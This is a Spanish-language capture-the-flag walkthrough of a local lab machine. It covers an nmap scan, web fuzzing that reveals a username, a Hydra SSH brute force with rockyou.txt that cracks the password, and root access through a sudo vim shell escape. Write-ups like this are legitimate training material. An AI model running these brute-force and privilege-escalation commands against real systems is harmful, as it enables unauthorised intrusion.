
Descomprimo la máquina y despliego el script.

```
sudo bash auto_deploy.sh trust.tar 
```

## **1.Reconocimiento inicial**

Escaneo los puertos  con nmap

```
 sudo nmap -p- --open -sV --min-rate=5000 -n -vvv 172.18.0.2 
```

Puertos abiertos detectados

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
```

## **2.Enumeración Web**

Me conecto a la web y se ve la pagina de inicio de Apache.

![[Pasted image 20260106102716.png]]

Comienzo a hacer **FUZZING**

```
dirb http://172.18.0.2/ -X .php, .html, .py, .txt, .env, .js 
```

Encontrado archivo 

```
http://172.18.0.2/secret.php
```

Ejecuto curl para ver el contenido 

```
curl http://172.18.0.2/secret.php   
```

me arroja el contenido

```
</head>
<body>
<div class="container">
   <h1>Hola Mario,</h1>
   <p>Esta web no se puede hackear.</p>
</div>
</body>
</html>

```

Parece que  MARIO puede ser un nombre de usuario.

## **3. Ataque de fuerza bruta y acceso SSH**


Ejecuto hydra

```
 hydra -l mario -P /usr/share/wordlists/rockyou.txt -V ssh://172.18.0.2 -t 10 
```

Me lanza el resultado

```
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
```

Me conecto via SSH

```
ssh mario@172.18.0.2                                         
```


## **4.Escalada de privilegios**

Ejecuto sudo -l para verificar permisos sudo

```
sudo -l
```

Respuesta:

```
User mario may run the following commands on c46e9e624dff:
(ALL) /usr/bin/vim
```

Ejecuto vim para la escalada de privilegios

```
sudo vim -c ':!/bin/sh'
```

Ejecuto whoami para verificar el usuario 

```
# whoami
root
```

Ya tenemos acceso root



